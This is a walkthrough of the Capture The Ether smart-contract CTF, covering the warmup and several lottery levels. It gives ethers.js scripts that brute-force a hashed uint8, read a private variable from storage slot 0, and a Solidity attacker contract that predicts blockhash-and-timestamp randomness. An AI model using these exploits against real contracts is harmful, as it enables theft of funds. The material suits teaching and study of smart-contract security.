# capture-the-ether-solutions
Walkthrough every level of the Capture The Ether CTF



# Solutions


## Warmup

### Deploy a contract

This level just teaches how to create an instance. Click deploy and you're ready to go.


### Call Me

Just copy and paste the level code within a Remix session and copy the instance address. Call `callme()` and submit the instance.


### Choose a Nickname

The only trick of this level is the casting from string to bytes32. If you use a hashing function such as `keccak256(bytes(stringValue))` it won't work as intended. Just run a script that handles the conversion from string to a hex value and that's it.

    describe("Setting Nickname", function () {
        it("Should Set the nickname", async function () {
            const myName = "ElPityMartinez"
            const instance = await ethers.getContractAt(
                "NicknameChallenge",
                "0x71c46Ed333C35e4E6c62D32dc7C8F00D125b4fee"
            );
            const [owner] = await ethers.getSigners();
            
            const newName = ethers.utils.formatBytes32String(myName);
            await instance.connect(owner).setNickname(newName);
        });
    });


## Lotteries

### Guess The Number

This level is quite straight forward. Just call `guess(42)`. Please make sure that you hold at least a balance of `2 rETH + dust`.

    describe("Guessing", function () {
        it("Should Guess the number", async function () {
            const instanceAddr = "0x89E0aE27eA9874aDD6ff5923B520D88C41f6B80e";
            const instance = await ethers.getContractAt("GuessTheNumber", instanceAddr);
            const [owner] = await ethers.getSigners();
            
            // Checking that the contract has 1 ether balance on deployment.
            expect(await ethers.provider.getBalance(instanceAddr)).to.be.eq(ethers.utils.parseEther("1"));

            await instance.connect(owner).guess(42, {value: ethers.utils.parseEther("1")});
            
            // Checking win condition.
            expect(await ethers.provider.getBalance(instanceAddr)).to.be.eq(ethers.utils.parseEther("0"));

        });
    });

### Guess The Secret Number

To solve this it is important to know how a hashing function works. It spans the input data into a scrambled and encoded-like bytes32 chain. The input data should be a bytes data but the key is that those bytes could be number concatenated with strings with different size. So, the return data size will always have 32 bytes, independently from the real input size. Also, the `keccak256` is a asymmetric hashing function. Which means that it works in one way. Knowing the return (image of the function), does not give information about the input. But the most important thing in here is that the hash will always be the same as long as the input parameters are constant.

Taking this into account, and knowing that the maximum value of a `uint8` number is `255`. This can be easily get by doing `type(uint8).max`, `uint8(-1)` in older solidity versions or even `unchecked{ uint8(-1); }` as for `>0.8.0` compiler versions.

Also, we see that the answer is validated only hashing a single input parameter (the guessed number). Which makes it pretty vulnerable. The hash can be bruteforced by creating a script that loops from 0 to 255, and checking if the hash of that number is the same as the `answerHash`. A note on this, if the hashing function used also other parameter, for example `keccak256(abi.encodePacked(n,y))`, the difficulty would increase exponentially but still it is possible to bruteforce the hash. So, it is strongly recommended not to use a hash or even a private variable as a source of "secrecy" or randomness.

By running this script the level is easily cracked:

    describe("Guessing", function () {
        it("Should Guess the secret number", async function () {
            const instanceAddr = "0xAaf26E43dd44cCBeD005c23B4d483bCa95448f5B";
            const nearlySecretHash = "0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365";

            const instance = await ethers.getContractAt("IGuessTheSecretNumberChallenge", instanceAddr);
            const [owner] = await ethers.getSigners();
            
            // Checking that the contract has 1 ether balance on deployment.
            expect(await ethers.provider.getBalance(instanceAddr)).to.be.eq(ethers.utils.parseEther("1"));

            const maxUint8 = 255;
            for (let index = 0; index <= maxUint8; index++) {
                if(ethers.utils.keccak256(index) == nearlySecretHash){
                    console.log(`The secret number was ${index}`);
                    await instance.connect(owner).guess(index, {value: ethers.utils.parseEther("1")});
                }  
            }

            // Checking win condition.
            expect(await ethers.provider.getBalance(instanceAddr)).to.be.eq(ethers.BigNumber.from("0"))

        });
    });



### Guess The Random Number

This level does not require you to calculate a single hash or even try to determine the `blockhash` of the deployment and `now`. It is important to know that the fact that a variable is not public means that the compiler won't translate that as a public view function in order to provide a getter for that (this is what does the compiler when a public variable is declared, it treats it as a public view function). But under no circumstances it means that the value of that variable is not _readable_ . Contracts have the storage layout registered within the blockchain. In other words, data of contracts is stored on chain and the slots where the information is held can be easily consulted if the right slot is spotted.

Each slot has a size of 32 bytes. So, every 32 bytes of information the EVM will add a slot to the stack in order to save information. If the variables that are declared have less than 32 bytes, they can be concatenated and stored in a single slot in order to save space. For example:

    uint256 one;   // this will use the slot 0.
    uint128 two_a; // this will start using slot 1.
    uint128 two_b; // concatenated with two_a on slot 1.

As a conclusion, the information held on each slot can be consulted easily if we know which slot we need to target. This level is solved by targeting the slot 0, because the `answer` variable is the only variable declared there. Using the `getStorageAt` function from ethers, we can get the value as a hex stored at the slot 0.

    describe("Guessing", function () {
        it("Should Guess the random number", async function () {
            const instanceAddr = "0x0C68e4Ef0aD5fb5410A1b0E6241C4a116370Ec35";

            const instance = await ethers.getContractAt("IGuessTheRandomNumberChallenge", instanceAddr);
            const [owner] = await ethers.getSigners();
            
            // Checking that the contract has 1 ether balance on deployment.
            expect(await ethers.provider.getBalance(instanceAddr)).to.be.eq(ethers.utils.parseEther("1"));

            const answer = parseInt(await ethers.provider.getStorageAt(instanceAddr, 0));

            console.log(`The answer is: ${answer}`);
           
            await instance.connect(owner).guess(answer, {value: ethers.utils.parseEther("1")});

            // Checking win condition.
            expect(await ethers.provider.getBalance(instanceAddr)).to.be.eq(ethers.utils.parseEther("0"))

        });
    });

### Guess The New Number

The challenge in here is identifying that the pseudo-random number is generated every time the function is called according to the current parameters of the chain. Because of this, those values can be either manipulated by miners and also precalculated by any user if the call is executed in a single step as it is shown. Because we are going to need the current blockchain parameters in order to solve this, the following contract is used to crack this level:

    pragma solidity ^0.8.13;

    contract GuessTheNewNumberAttacker{
        function attack(address _destination) external payable{
            require(address(this).balance >= 1 ether);

            uint8 calculatedAnswer = uint8(
                uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
                ));

            IGuessTheNewNumberChallenge(_destination).guess{value: 1 ether}(calculatedAnswer);

            require(IGuessTheNewNumberChallenge(_destination).isComplete(), "!completed");
            // Transfer back all the funds to the user
            (bool withdrawn, ) = payable(tx.origin).call{value: address(this).balance}("");
            require(withdrawn,  "!withdrawn");
        }

        receive() external payable {}
    }  

A reminder, do not forget implementing the `receive` fallback. Otherwise, the call will fail because when the instance sends `2 ether` to the winner on this case it will try sending them to `GuessTheNewNumberAttacker`. If the contract lacks from receive or of a payable fallback, it cannot receive assets from regular transfers.